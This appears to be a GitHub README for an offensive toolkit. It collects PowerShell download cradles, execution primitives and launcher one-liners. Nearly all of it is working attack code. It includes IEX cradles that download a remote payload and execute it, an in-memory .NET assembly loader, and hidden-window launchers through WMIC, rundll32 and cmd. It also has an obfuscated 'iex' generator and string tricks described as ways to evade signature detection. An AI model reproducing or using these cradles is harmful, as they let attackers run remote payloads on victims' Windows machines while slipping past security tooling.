<p align="center">
   <img src="https://img.shields.io/github/repo-size/chainski/Powershell-Cradles?style=for-the-badge&color=1c90ce">
   <img src="https://hits.sh/github.com/chainski/Powershell-Cradles.svg?style=for-the-badge&label=views&color=1c90ce">
   <img src="https://hits.sh/github.com/chainski/Powershell-Cradles.svg?style=for-the-badge&label=views&color=1c90ce">
</p>

<div align="center">

<pre>
 ██████╗ ███╗   ██╗███████╗██╗     ██╗███╗   ██╗███████╗██████╗ ███████╗
██╔═══██╗████╗  ██║██╔════╝██║     ██║████╗  ██║██╔════╝██╔══██╗██╔════╝
██║   ██║██╔██╗ ██║█████╗  ██║     ██║██╔██╗ ██║█████╗  ██████╔╝███████╗
██║   ██║██║╚██╗██║██╔══╝  ██║     ██║██║╚██╗██║██╔══╝  ██╔══██╗╚════██║
╚██████╔╝██║ ╚████║███████╗███████╗██║██║ ╚████║███████╗██║  ██║███████║
 ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚══════╝
</pre>


</div>

---

# PowerShell Cradles and Oneliners

A curated and re-organized collection of `PowerShell` download cradles, execution primitives, and launcher one-liners.

## Contents

1. [Extra goodies — deobfuscation helpers](#1-extra-goodies--deobfuscation-helpers)
2. [Dynamic math obfuscation (`GetObfIEX`)](#2-iex--dynamic-math-obfuscation-getobfiex)
3. [Code execution primitives](#3-code-execution-primitives)
4. [Payload download primitives](#4-payload-download-primitives)
5. [OS launcher primitives](#5-os-launcher-primitives)
6. [Combined download cradles](#6-combined-download-cradles)
7. [.NET assembly load](#7-net-assembly-load)
8. [String & encoding tricks](#8-string--encoding-tricks)
9. [Download methods](#9-download-methods--grouped-by-engine)
10. [Additional cradles & obfuscation](#10-additional-cradles--obfuscation)

---

## 1. Extra goodies, deobfuscation helpers

Obfuscated `FromBase64String` with `-bxor`, clean for dynamic string deobfuscation:

```ps1
$t=([type]('{1}{0}'-f'vert','Con'))
($t::(($t.GetMethods()|?{$_.Name-clike'F*g'}).Name).Invoke('Yk9CA05CA0hMV0I=')|%{$_-bxor35}|%{[char]$_})-join''
```

Same idea, but for UTF-16 base64-encoded strings:

```ps1
$t=([type]('{1}{0}'-f'vert','Con'))
-join[char[]]([uint16[]]$t::(($t.GetMethods()|?{$_.Name-clike'F*g'}).Name).Invoke('MAA7ACAAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUA')-ne0)
```

---

## 2. Dynamic math obfuscation (`GetObfIEX`)

`GetObfIEX` builds `Invoke-Expression` from char codes through a random `switch` that applies one of **four self-cancelling math forms** per character (`+n-n`, `-n+n`, `b*c/b`, `a+(c-a)`), so the string never contains the literal token `iex`.

```ps1
function GetObfIEX{'&('+(((Get-Alias i*x).Name.ToCharArray()|%{$c=[int]$_;switch(1..4|Get-Random){1{$n=1..40|Get-Random;"[char]($($c+$n)-$n)"}2{$n=1..30|Get-Random;"[char]($($c-$n)+$n)"}3{$b=1..16|Get-Random;"[char](($b*$c)/$b)"}4{$a=1..($c-1)|Get-Random;"[char]($a+($c-$a))"}}})-join'+')+')'}GetObfIEX
```

The alias wildcard `i*x` resolves to `iex`. Each `switch` arm reduces to `[char]$c`, so every run emits `i`,`e`,`x` regardless of which branch the random pick lands on:

1. `[char](($c+$n)-$n)` — addition then subtraction
2. `[char](($c-$n)+$n)` — subtraction then addition
3. `[char](($b*$c)/$b)` — multiply then divide
4. `[char]($a+($c-$a))` — split then recombine

Sample generated result (fresh random branches every run):

```ps1
&([char](111-6)+[char]((11*101)/11)+[char](110+10))
```

Drop-in usage, invoke the generated `iex` and feed it a payload:

```ps1
& ([char](111-6)+[char]((11*101)/11)+[char](110+10)) 'Get-Service -Name spooler'
```

---

## 3. Code execution primitives

> The phrase `(Function).Invoke()` can always be rephrased as `&(Function)`.

**1. ScriptBlock**

```ps1
[scriptblock]::Create('Get-Service').Invoke()
```

**2. PS1.0 Invoke** — resolves `InvokeCommand` + `InvokeScript` via reflection:

```ps1
$ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).PsObject.Methods|Where{$_.Name-ilike'In*'}).Name).Invoke('Get-Service')
```

**3. Get-Alias** — wildcard over the `Alias:` drive:

```ps1
&(DIR Alias:/I*X)'Get-Service'
```

**4. Get-Command** — wildcard `GCM` resolution; note `.Name` is required, invoking a wildcard-resolved `CommandInfo` directly throws on PS 5.1:

```ps1
&((GCM I*e-E*).Name)'Get-Service'
```

**5. PowerShell Runspace**

```ps1
[PowerShell]::Create().(([PowerShell]::Create()|Member)[5].Name).Invoke('Get-Service').Invoke()
```

**6. Concatenated IEX** — extracts `i`,`e`,`x` from the `Substring` method signature:

```ps1
&(''.SubString.ToString()[67,72,64]-Join'')'Get-Service'
```

**7. Invoke-AsWorkflow** (PS 3.0+)

```ps1
Invoke-AsWorkflow -Ex ('Get-Service')
```

---

## 4. Payload download primitives

**1. Invoke-RestMethod** (PS 3.0+)

```ps1
('https://127.0.0.1/uploads/payload.txt'|%{(IRM $_)})
```

**2. `Net.WebClient.DownloadString`** method name resolved via wildcard `Get-Member` (evades the reflection-signature detection):

```ps1
$w=(New-Object Net.WebClient);$m=($w|Get-Member|?{$_.Name-like'D*oad*ing'}).Name;$w.$m.Invoke('https://127.0.0.1/uploads/payload.txt')
```

**3. `Net.WebRequest`**

```ps1
[IO.StreamReader]::new([Net.WebRequest]::Create('https://127.0.0.1/uploads/payload.txt').GetResponse().GetResponseStream()).ReadToEnd()
```

**4. `Msxml2.XMLHTTP` COM object**

```ps1
$c=New-Object -ComObject MsXml2.ServerXmlHttp;$c.Open('GET','https://127.0.0.1/uploads/payload.txt',0);$c.Send();$c.ResponseText
```

---

## 5. OS launcher primitives

**1. WMIC** — *deprecated and removed on modern Windows (no `wmic.exe` on Win11/Server 2022)*. Kept for legacy targets:

```ps1
WMIc "pROCESs" cALl crEATE "PoWErSheLL -WInDowstyLE HIdDEn -NonINTErA Get-Service"
```

**2. Rundll32 `SHELL32.DLL,ShellExec_RunDLL`**

```ps1
RuNDlL32.exE SHELL32,ShellExec_RunDLL "POWERsHeLL" "-w 1" "-NonInter" "-CO" "Get-Service"
```

**3. Cmd + `set VAR && powershell iex VAR`** — `iex` generated by `GetObfIEX` (the `&` is cmd-escaped as `^&`):

```ps1
cmd /c "set sqm=Get-Service -Name spooler& powershell -nop -c ^&([char](111-6)+[char]((11*101)/11)+[char](110+10))($env:sqm)"
```

**4. Cmd + `Echo | powershell -` (stdin)**

```ps1
CmD.exE /c" ECho/Get-Service | PoWeRsheLL -nOninT -WindOw hiDDe -ComM (gcI 'vARiaBLE:eX*xT').vAluE.InvoKECOmmanD.InVOkESCript($inPut)"
```

**5. Cmd + `Echo | clip && powershell iex clipboard`** — reads the payload from the clipboard, `iex` generated by `GetObfIEX`:

```ps1
cmd /c "echo Get-Service -Name spooler | clip & powershell -nop -c Add-Type -AN System.Windows.Forms; ^&([char](111-6)+[char]((11*101)/11)+[char](110+10))([Windows.Forms.Clipboard]::GetText())"
```

---

## 6. Combined download cradles

**1. PowerShell 3.0+**

```ps1
IEX (iwr 'https://127.0.0.1/uploads/payload.txt')
```

**2. Normal download cradle**

```ps1
IEX (New-Object Net.Webclient).downloadstring("https://127.0.0.1/uploads/payload.txt")
```

**3. `ScriptBlock` + `Invoke-RestMethod`**

```ps1
[scriptblock]::Create(('https://127.0.0.1/uploads/payload.txt'|%{(IRM $_)})).Invoke()
```

**4. `Msxml2.XMLHTTP` COM + `ScriptBlock`**

```ps1
$c=New-Object -ComObject MsXml2.ServerXmlHttp;$c.Open('GET','https://127.0.0.1/uploads/payload.txt',0);$c.Send();[scriptblock]::Create($c.ResponseText).Invoke()
```

**5. Minimized `Net.WebRequest` + `ScriptBlock`**

```ps1
[scriptblock]::Create([IO.StreamReader]::new([Net.WebRequest]::Create('https://127.0.0.1/uploads/payload.txt').GetResponse().GetResponseStream()).ReadToEnd()).Invoke()
```

**6. `Net.WebClient.DownloadString` (wildcard) + Get-Alias `iex`**

```ps1
$w=(New-Object Net.WebClient);$m=($w|Get-Member|?{$_.Name-like'D*oad*ing'}).Name;$w.$m.Invoke('https://127.0.0.1/uploads/payload.txt')|&(DIR Alias:/I*X)
```

**7. `Net.HttpWebRequest` + `GetObfIEX`** — method names built via `-f`, stream read, executed with the math-obfuscated `iex`:

```ps1
$h=[Type]('{1}{2}{0}'-f('pWebRe'+'quest'),'Ne','t.Htt')
$s=$h::Create('https://127.0.0.1/uploads/payload.txt').('{0}{1}'-f'Get','Response')().('{0}{1}'-f'Get','ResponseStream')()
$r=[IO.StreamReader]::new($s).ReadToEnd()
& ([char](111-6)+[char]((11*101)/11)+[char](110+10)) $r
```

---

## 7. .NET assembly load

Load an assembly from downloaded bytes, then invoke its entry point:

```ps1
([reflection.assembly]::load([net.webclient]::new().('downloaddata')('https://127.0.0.1/payload.exe'))).('EntryPoint').invoke($n,$n)
```

---

## 8. String and encoding tricks

**Unicode escape** — `[regex]::Unescape` resolves `\uXXXX` to literal chars:

```ps1
([regex]::Unescape("\u0063\u0061\u006C\u0063\u002E\u0065\u0078\u0065"))
# -> calc.exe
```

**Reversed base64** — reverse the string before decoding. The sample below decodes to `calc.exe`:

```ps1
$reversedb64 = "=UGel5yYsF2Y"
$base64 = $reversedb64.ToCharArray();[array]::Reverse($base64);-join($base64)|OUt-nUll
$decoder = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("$base64"))|iex
```

---

## 9. Download methods grouped by engine

Grouped by the underlying network engine so overlapping mechanisms are listed once.

### Engine: BITS service

```ps1
$ProgressPreference = 'SilentlyContinue'
$source = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
$localpath = "$env:userprofile\downloads\putty.exe"
Start-BitsTransfer -Source $source -Destination $localpath
```

### Engine: System.Net.Http.HttpClient (built-in cmdlets)

`Invoke-WebRequest` (`iwr`) — the workhorse, `-OutFile` saves binary directly:

```ps1
$ProgressPreference = 'SilentlyContinue'
$source = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
$localpath = "$env:userprofile\downloads\putty.exe"
Invoke-WebRequest -Uri $source -OutFile $localpath
```


```ps1
$ProgressPreference = 'SilentlyContinue'
('https://127.0.0.1/uploads/payload.txt'|%{(IRM $_)})
```

### Engine: System.Net.WebClient (wraps HttpWebRequest)

```ps1
$source = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
$localpath = "$env:userprofile\downloads\putty.exe"
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($source, $localpath)
```

### Engine: System.Net.Http.HttpClient (raw .NET)

```ps1
Add-Type -AssemblyName System.Net.Http
$source = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
$localpath = "$env:userprofile\downloads\putty.exe"
$httpClient = New-Object Net.Http.HttpClient
$response = $httpClient.GetAsync($source).Result
$stream = $response.Content.ReadAsStreamAsync().Result
$fileStream = [IO.File]::Create($localpath)
$stream.CopyTo($fileStream)
$fileStream.Close()
```

### Engine: WinHTTP (COM)

```ps1
$source = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
$localpath = "$env:userprofile\downloads\putty.exe"
$winHttp = [Activator]::CreateInstance([Type]::GetTypeFromProgID('WinHttp.WinHttpRequest.5.1'))
$winHttp.Open('GET', $source, $false)
$winHttp.Send()
[IO.File]::WriteAllBytes($localpath,$winHttp.ResponseBody)
```

### Engine: MSXML (COM)

```ps1
$source = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
$localpath = "$env:userprofile\downloads\putty.exe"
$xmlHttp = [Activator]::CreateInstance([Type]::GetTypeFromProgID('MSXML2.ServerXMLHTTP.6.0'))
$xmlHttp.open('GET', $source, $false)
$xmlHttp.send()
[IO.File]::WriteAllBytes($localpath,$xmlHttp.responseBody)
```

---

## 10. Additional cradles and obfuscation

Extra evasion patterns — string splitting, replaces, escapes, format strings, encoding, and alternate invocation.

### Standard cradle → layered obfuscation

```ps1
# letter replacement
Invoke-Expression (New-Object Net.WebClient).((('ZownloadString').replace('Z','D')))("https://127.0.0.1/uploads/payload.txt")

# string concatenation
Invoke-Expression (New-Object Net.WebClient).DownloadString("ht"+"tps://127.0.0.1/uploads/payload.txt")

# backtick escape characters
Invoke-Expression (New-Object Net.WebClient)."D`o`wn`l`oad`Str`in`g"('h'+'ttps://127.0.0.1/uploads/payload.txt')

# -f format string
IEX ('({0}w-Object {0}t.WebClient).{1}String("{2}")' -f 'Ne','Download','https://127.0.0.1/uploads/payload.txt')
```

### Reverse the command string

```ps1
$re = ")'txt.daolyap/sdaolpu/1.0.0.721//:sptth'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN("
IEX ($re[-1..-($re.Length)] -Join '')
```

### Split / replace junk delimiters

```ps1
$cmd = "(New-Object Net.We~~bClient).Downlo~~adString('https://127.0.0.1/uploads/payload.txt')"
IEX ($cmd.Replace("~~",""))
```

### Base64 command encoding

```ps1
$command = "Write-Host 'Hello World!'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand
```

### Get-Command wildcard for `New-Object`

```ps1
&(Get-Command New-Obje*) "Net.WebClient"
&(GCM *w-O*) "Net.WebClient"
```

### ScriptBlock construction variants

```ps1
invoke-command{Write-Host SUCCESS}
{Write-Host SUCCESS}.invoke()
$ExecutionContext.InvokeCommand.NewScriptBlock("Write-Host SUCCESS")
[Scriptblock]::Create("Write-Host SUCCESS")
```

### Alternate `iex` resolution via `GetCmdlets` / `InvokeScript`

```ps1
$ExecutionContext.InvokeCommand.GetCmdlets('I*e-E*')
$ExecutionContext.InvokeCommand.InvokeScript('Get-Service')
[PowerShell]::Create().AddScript('Get-Service').Invoke()
```

### Powershell Obfuscators 

- [x] [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- [x] [AES-Encoder](https://github.com/chainski/AES-Encoder/blob/main/AES-Encoder.ps1)
- [x] [psobf](https://github.com/TaurusOmar/psobf)
- [x] [PowerCrypt](https://github.com/KingKDot/PowerCrypt)

## License
This project is licensed under the **GNU General Public License v3.0**.

